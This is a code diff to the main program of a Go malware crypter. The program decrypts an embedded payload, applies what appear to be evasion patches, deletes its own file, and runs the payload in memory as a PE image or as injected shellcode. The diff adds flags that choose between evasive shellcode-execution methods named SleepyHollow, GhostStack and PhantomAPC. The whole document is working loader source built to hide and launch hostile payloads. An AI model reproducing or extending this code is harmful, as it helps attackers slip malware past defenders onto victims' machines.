@@ -6,6 +6,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	_ "embed"
+	"flag"
 	"fmt"
 	"io"
 	"strings"
@@ -15,6 +16,7 @@ import (
 	"golang.org/x/crypto/twofish"
 	"github.com/carved4/go-direct-syscall"
 	runpe "go-crypter/pkg/runpe"
+	runshellalt "go-crypter/pkg/runshellalt"
 )
 //go:embed payload.cbor
 var payloadData []byte
@@ -129,6 +131,13 @@ func decryptFile() ([]byte, error) {
 }
 
 func main(){
+	// Parse command line flags
+	sleepyHollowFlag := flag.Bool("sleepy", false, "Use SleepyHollow evasive shellcode execution method")
+	ghostFlag := flag.Bool("ghost", false, "Use GhostStack thread context manipulation execution method")
+	phantomFlag := flag.Bool("phantom", false, "Use PhantomAPC asynchronous procedure call injection method")
+	flag.Parse()
+
+	winapi.ApplyAllPatches()
 	decryptedBytes, err := decryptFile()
 	if err != nil {
 		fmt.Println("Error decrypting file:", err)
@@ -142,20 +151,55 @@ func main(){
 		return
 	}
 
+	
+	// Ensure only one execution method is selected for shellcode
+	executionMethodCount := 0
+	if *sleepyHollowFlag {
+		executionMethodCount++
+	}
+	if *ghostFlag {
+		executionMethodCount++
+	}
+	if *phantomFlag {
+		executionMethodCount++
+	}
+	
+	if executionMethodCount > 1 {
+		fmt.Println("Error: cannot use multiple shellcode execution methods simultaneously")
+		return
+	}
+
 	// Execute based on payload type
 	switch strings.ToLower(payload.PayloadType) {
 	case "exe":
 		winapi.SelfDel()
-		winapi.ApplyAllPatches()
 		runpe.ExecuteInMemory(decryptedBytes)
 	case "shellcode":
 		winapi.SelfDel()
-		winapi.ApplyAllPatches()
-		winapi.NtInjectSelfShellcode(decryptedBytes)
+		if *sleepyHollowFlag {
+			err := runshellalt.SleepyHollow(decryptedBytes)
+			fmt.Println("SleepyHollow execution started")
+			if err != nil {
+				fmt.Println("SleepyHollow execution failed:", err)
+			}
+		} else if *ghostFlag {
+			fmt.Println("GhostStack execution started")
+			err := runshellalt.GhostStack(decryptedBytes)
+			if err != nil {
+				fmt.Println("GhostStack execution failed:", err)
+			}
+		} else if *phantomFlag {
+			fmt.Println("PhantomAPC execution started")
+			err := runshellalt.PhantomAPC(decryptedBytes)
+			if err != nil {
+				fmt.Println("PhantomAPC execution failed:", err)
+			}
+		} else {
+			winapi.NtInjectSelfShellcode(decryptedBytes)
+		}
 	default:
-		winapi.SelfDel()
-		winapi.ApplyAllPatches()
-		winapi.NtInjectSelfShellcode(decryptedBytes)
+		fmt.Println("Unknown payload type:", payload.PayloadType)
+		fmt.Println("Supported types: exe, shellcode")
 	}
 }
 
